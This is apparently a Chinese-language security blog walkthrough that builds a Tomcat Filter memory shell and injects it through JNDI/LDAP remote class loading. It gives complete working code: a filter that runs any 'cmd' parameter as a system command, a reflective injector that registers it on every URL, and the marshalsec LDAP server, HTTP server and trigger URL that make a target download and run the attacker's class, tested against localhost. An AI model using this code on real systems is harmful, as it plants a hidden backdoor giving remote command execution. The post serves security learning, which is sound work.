+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Attacker/</span><br><span class="line">├── src/main/java/com/vuln</span><br><span class="line">│   ├── EvilFilter.java       # 恶意Filter（命令执行逻辑）</span><br><span class="line">│   ├── FilterInject.java     # JNDI远程加载的注入类</span><br><span class="line">│   └── ClassToBase64.java    # 辅助工具：类→Base64字符串</span><br><span class="line">└── pom.xml</span><br></pre></td></tr></table></figure>
+
+<p><code>pom.xml</code> 引入Javassist（用于字节码操作）和Tomcat相关依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.29.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.107<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="思路拆解"><a href="#思路拆解" class="headerlink" title="思路拆解"></a>思路拆解</h2><p>在写具体代码之前，先把整个攻击流程的障碍点想清楚。</p>
+<p><strong>整体目标</strong>：让被攻击服务器执行 <code>lookup()</code>，触发LDAP查询 → LDAP服务（marshalsec）返回Reference告知class地址 → 被攻击服务器去HTTP服务下载 <code>FilterInject.class</code> → 本地实例化 → 构造方法自动执行 → Filter内存马注入成功。</p>
+<p>构造方法里需要做三件事：</p>
+<ol>
+<li>拿到恶意Filter的对象实例</li>
+<li>拿到当前Web应用的 <code>StandardContext</code> 对象</li>
+<li>把Filter动态注册进去</li>
+</ol>
+<p>逐一分析怎么实现。</p>
+<hr>
+<h3 id="问题一：恶意Filter怎么传过去"><a href="#问题一：恶意Filter怎么传过去" class="headerlink" title="问题一：恶意Filter怎么传过去"></a>问题一：恶意Filter怎么传过去</h3><p>我们的目的就是把filter和注册两段代码上传到服务器。</p>
+<p>如果按照以前学过的，把filter写成匿名内部类和注册代码放一起，可以写成一个文件。但是编译的时候会产生两个文件：<code>FilterInject.class</code> 和 <code>FilterInject$EvilFilter.class</code>，这样上传的话两个文件都要放到HTTP服务上才行。</p>
+<p>这里可能有个疑问：需不需要调用两次 <code>lookup</code>？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lookup(&quot;ldap://127.0.0.1:1099/FilterInject&quot;)  ← 只有这一次</span><br><span class="line"></span><br><span class="line">JVM加载FilterInject时发现依赖内部类</span><br><span class="line">→ 自动向HTTP服务发第二次请求要FilterInject$EvilFilter.class</span><br><span class="line">→ 这个过程是ClassLoader自动触发的，跟lookup没关系</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<ul>
+<li>lookup调用次数：<strong>1次</strong></li>
+<li>HTTP服务被请求次数：<strong>2次</strong></li>
+</ul>
+<p>python HTTP服务日志里能看到两条GET记录，一条取 <code>FilterInject.class</code>，一条取 <code>FilterInject$EvilFilter.class</code>，RCE效果是一样的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422153303399.png"></p>
+<p>也有只上传一个文件的方法，就是单独写一个EvilFilter文件，把它编译后的class转换成Base64，再在FilterInject的构造方法中，注册Filter之前先把Base64还原并加载EvilFilter类。但是因为原Tomcat服务器里面是没有EvilFilter这个类的，直接加载会报错，所以需要用到 <code>ClassLoader</code> 的 <code>defineClass</code> 方法把字节码还原成 <code>Class</code> 对象。</p>
+<p>这里可能会有个问题：为什么EvilFilter需要用 <code>defineClass</code>，为什么上传FilterInject的时候不用也能直接被加载？</p>
+<p>其实FilterInject也用了defineClass，只不过是JDK帮你调的。EvilFilter是在FilterInject内部用到的，不会自己加载，需要自己用defineClass手动还原。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FilterInject 的加载流程（JDK自动）：</span><br><span class="line">InitialContext.lookup()</span><br><span class="line">→ LDAP客户端收到Reference</span><br><span class="line">→ NamingManager.getObjectInstance()</span><br><span class="line">→ VersionHelper.loadClass()</span><br><span class="line">→ URLClassLoader.findClass()</span><br><span class="line">→ URLClassLoader.defineClass()  ← 在这里，JDK内部自动调的</span><br><span class="line">→ 实例化FilterInject</span><br><span class="line"></span><br><span class="line">EvilFilter 的加载流程（手动）：</span><br><span class="line">构造方法执行到一半，需要EvilFilter</span><br><span class="line">→ 没有人帮你去下载，没有人帮你调defineClass</span><br><span class="line">→ 只有你自己通过反射手动调</span><br></pre></td></tr></table></figure>
+
+<p><code>ClassLoader</code> 有一个 <code>protected</code> 的 <code>defineClass()</code> 方法，入参是字节数组，可以直接把字节码还原成 <code>Class</code> 对象。因为是 <code>protected</code>，只能用反射调用。</p>
+<hr>
+<h3 id="问题二：StandardContext怎么拿"><a href="#问题二：StandardContext怎么拿" class="headerlink" title="问题二：StandardContext怎么拿"></a>问题二：StandardContext怎么拿</h3><p>上一篇有讲过的，这里简单过一下。</p>
+<p>要动态注册Filter，必须拿到 <code>StandardContext</code>（Tomcat中代表一个Web应用的核心上下文对象）。</p>
+<p>通过调试发现，<code>Thread.currentThread().getContextClassLoader()</code> 在Tomcat环境下返回的是 <code>ParallelWebappClassLoader</code> 对象。可以发现其父类 <code>WebappClassLoaderBase</code> 中有一个 <code>resources</code> 字段，类型是 <code>WebResourceRoot</code> 接口，实际实例是 <code>StandardRoot</code>。而 <code>StandardRoot</code> 中有一个 <code>context</code> 字段，就是我们要的 <code>StandardContext</code>！</p>
+<p>完整反射链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line">    → ParallelWebappClassLoader</span><br><span class="line">        → (父类) WebappClassLoaderBase.resources  [WebResourceRoot/StandardRoot]</span><br><span class="line">            → StandardRoot.context  [StandardContext] ✓</span><br></pre></td></tr></table></figure>
+
+<p>实现代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类加载器并强转</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向上遍历父类，找到 resources 字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(pwcl);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 StandardRoot 中反射取出 context</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> extractContext(resources);</span><br></pre></td></tr></table></figure>
+
+<p>遍历父类查找字段的辅助方法（因为 <code>resources</code> 在父类中，<code>getDeclaredField</code> 只查当前类，所以要循环往上找）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getFieldFromHierarchy</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            clazz = clazz.getSuperclass();  <span class="comment">// 找不到就去父类找</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从 <code>StandardRoot</code> 提取 <code>StandardContext</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">extractContext</span><span class="params">(Object resources)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (resources <span class="keyword">instanceof</span> StandardRoot) &#123;</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) resources;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> standardRoot.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> contextField.get(standardRoot);</span><br><span class="line">        <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">            <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="问题三：Filter怎么注册"><a href="#问题三：Filter怎么注册" class="headerlink" title="问题三：Filter怎么注册"></a>问题三：Filter怎么注册</h3><p>这部分直接参考Filter内存马的标准注册流程，三步走：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">filterDef.setFilter(evilFilter);</span><br><span class="line">filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);  <span class="comment">// 拦截所有请求</span></span><br><span class="line"></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line">standardContext.addFilterMap(filterMap);</span><br><span class="line">standardContext.filterStart();  <span class="comment">// 激活，使Filter生效，代替了之前写的FilterConfig的反射写入</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="完整代码实现"><a href="#完整代码实现" class="headerlink" title="完整代码实现"></a>完整代码实现</h2><h3 id="恶意Filter：EvilFilter-java"><a href="#恶意Filter：EvilFilter-java" class="headerlink" title="恶意Filter：EvilFilter.java"></a>恶意Filter：EvilFilter.java</h3><p>执行cmd参数的命令，把结果写回response（和以前学过的完全一样就不赘述了）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream())</span><br><span class="line">            );</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(sb.toString());</span><br><span class="line">            <span class="keyword">return</span>;  <span class="comment">// 不向下传递，直接返回结果</span></span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="辅助工具：ClassToBase64-java"><a href="#辅助工具：ClassToBase64-java" class="headerlink" title="辅助工具：ClassToBase64.java"></a>辅助工具：ClassToBase64.java</h3><p>先把 <code>EvilFilter.java</code> 编译成 <code>.class</code>，再运行这个工具，把EvilFilter转成Base64字符串，输出的字符串复制备用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassToBase64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.vuln.EvilFilter&quot;</span>);  <span class="comment">// 通过类名获取</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();             <span class="comment">// 转为字节数组</span></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytecode));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="注入类：FilterInject-java"><a href="#注入类：FilterInject-java" class="headerlink" title="注入类：FilterInject.java"></a>注入类：FilterInject.java</h3><p>接下来就是读取class并还原加载，然后获取StandardContext注册Filter，再搭建JNDI的下载环境给服务器。把上面三个问题的解决方案全部整合到构造方法里：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.ParallelWebappClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterInject</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterInject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ① 获取 StandardContext</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(pwcl);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> extractContext(resources);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ② 还原 EvilFilter 对象</span></span><br><span class="line">        <span class="comment">// Base64字符串解码回字节数组</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQ...（此处替换为 ClassToBase64 输出的字符串）&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] classBytes = Base64.getDecoder().decode(b64);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射调用 ClassLoader.defineClass() 还原 Class 对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class="line">            <span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class</span><br><span class="line">        );</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; filterClass = (Class&lt;?&gt;) defineClass.invoke(cl, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        <span class="comment">// 实例化得到 Filter 对象（这里也是反射）</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> (Filter) filterClass.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ③ 注册 Filter 到 StandardContext</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        filterDef.setFilter(evilFilter);</span><br><span class="line">        filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line">        <span class="comment">// 激活，使Filter生效，代替了之前写的FilterConfig的反射写入</span></span><br><span class="line">        standardContext.filterStart();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Filter memory shell injected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getFieldFromHierarchy</span><span class="params">(Class&lt;?&gt; clazz, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123; <span class="keyword">return</span> clazz.getDeclaredField(name); &#125;</span><br><span class="line">            <span class="keyword">catch</span> (NoSuchFieldException e) &#123; clazz = clazz.getSuperclass(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">extractContext</span><span class="params">(Object resources)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (resources <span class="keyword">instanceof</span> StandardRoot) &#123;</span><br><span class="line">            <span class="type">StandardRoot</span> <span class="variable">sr</span> <span class="operator">=</span> (StandardRoot) resources;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> sr.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> f.get(sr);</span><br><span class="line">            <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="打入内存马"><a href="#打入内存马" class="headerlink" title="打入内存马"></a>打入内存马</h2><p>攻击端环境准备三件事。</p>
+<p>这里遇到了个小问题，因为编译时写的代码包含了包名，所以HTTP服务必须严格按照包名目录结构来放class文件，才能让被攻击服务器正确加载到。(建议不要写包名)</p>
+<p><strong>1. 编译 <code>FilterInject.java</code> 得到 <code>.class</code> 文件</strong></p>
+<p><strong>2. 用Python在classes根目录（class文件的根目录）启一个HTTP服务</strong>，让LDAP服务器能取到这个类文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\WWW\jndi_shell_attacker\target\classes</span><br><span class="line">&gt;&gt;&gt; python -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 启动LDAP服务</strong>，指向HTTP服务的 <code>FilterInject</code> 类：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8888/#com.vuln.FilterInject&quot;</span> 1899</span><br></pre></td></tr></table></figure>
+
+<p>然后触发漏洞——访问靶机漏洞URL，url参数指向我们的LDAP服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/vuln?url=ldap://127.0.0.1:1899/FilterInject</span><br></pre></td></tr></table></figure>
+
+<p>LDAP服务返回Reference，被攻击服务器向Python HTTP服务请求 <code>FilterInject.class</code>，Python服务日志确认类文件被成功获取（左边是python右边是marshalsec）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422132926495.png"></p>
+<p>服务端控制台打印注入成功信息：</p>
+<p>访问任意路径带上 <code>cmd</code> 参数，命令执行成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/sfdsdf?cmd=ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422133448999.png"></p>
+<p>重启Tomcat重新访问报错404，证明刚才的内存马确实是驻留在内存中的，重启之后就消失了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422133554390.png"></p>
+<hr>
+<h2 id="匿名内部类方案"><a href="#匿名内部类方案" class="headerlink" title="匿名内部类方案"></a>匿名内部类方案</h2><p>上面用的是Base64方案（只上传一个class文件），也可以直接把EvilFilter写成匿名内部类，和注册代码放在一起，这样就不需要ClassLoader.defineClass()了，代码更直观。但代价是编译后会产生两个class文件，HTTP服务上要同时放 <code>FilterInject_2.class</code> 和 <code>FilterInject_2$1.class</code>，lookup还是只调一次，JVM会自动去请求内部类的class文件。</p>
